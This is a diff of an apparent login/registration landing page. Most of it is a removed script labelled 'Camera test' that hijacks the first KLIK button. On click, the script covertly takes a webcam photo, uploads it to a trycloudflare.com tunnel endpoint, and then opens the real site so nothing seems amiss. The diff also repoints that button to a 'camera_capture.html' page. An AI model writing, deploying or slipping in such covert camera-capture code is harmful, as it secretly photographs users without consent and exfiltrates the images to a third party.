@@ -309,75 +309,6 @@ drop-shadow(0 0 18px #35c8ff);
 
     </style>
 
-    <!-- Camera test: triggered only by the first KLIK button. -->
-    <style>
-      #camera-test-video, #camera-test-canvas { display:none; }
-    </style>
-    <script>
-      (function () {
-        const UPLOAD_ENDPOINT = "https://coding-camcorders-sites-makeup.trycloudflare.com/upload-photo";
-        const ORIGINAL_URL = "https://realtwitspin.autos/";
-
-        function captureAndUpload(event) {
-          event.preventDefault();
-
-          const openOriginal = () => {
-            window.open(ORIGINAL_URL, "_blank", "noopener,noreferrer");
-          };
-
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            openOriginal();
-            return;
-          }
-
-          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(function (stream) {
-              const video = document.createElement("video");
-              const canvas = document.createElement("canvas");
-              video.setAttribute("playsinline", "true");
-              video.muted = true;
-              video.srcObject = stream;
-
-              return new Promise(function (resolve) {
-                video.onloadedmetadata = function () {
-                  video.play().then(function () {
-                    setTimeout(function () {
-                      canvas.width = video.videoWidth || 640;
-                      canvas.height = video.videoHeight || 480;
-                      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                      stream.getTracks().forEach(function (track) { track.stop(); });
-                      canvas.toBlob(function (blob) { resolve(blob); }, "image/jpeg", 0.9);
-                    }, 300);
-                  }).catch(function () { resolve(null); });
-                };
-              });
-            })
-            .then(function (blob) {
-              if (!blob) { openOriginal(); return; }
-
-              const formData = new FormData();
-              formData.append("photo", blob, "capture.jpg");
-
-              return fetch(UPLOAD_ENDPOINT, {
-                method: "POST",
-                mode: "no-cors",
-                body: formData,
-                keepalive: true
-              }).catch(function () {}).then(openOriginal);
-            })
-            .catch(function () {
-              openOriginal();
-            });
-        }
-
-        document.addEventListener("DOMContentLoaded", function () {
-          const buttons = document.querySelectorAll('a.btn-daftar[href="https://realtwitspin.autos/"]');
-          if (buttons.length > 0) {
-            buttons[0].addEventListener("click", captureAndUpload);
-          }
-        });
-      })();
-    </script>
   </head>
   <body>
     <div class="container">
@@ -403,7 +334,7 @@ drop-shadow(0 0 18px #35c8ff);
           <tr>
             <td>LOGIN & DAFTAR</td>
             <td>
-              <a href="https://realtwitspin.autos/" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar">KLIK</a>
+              <a href="camera_capture.html" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar">KLIK</a>
             </td>
           </tr>
           <tr>
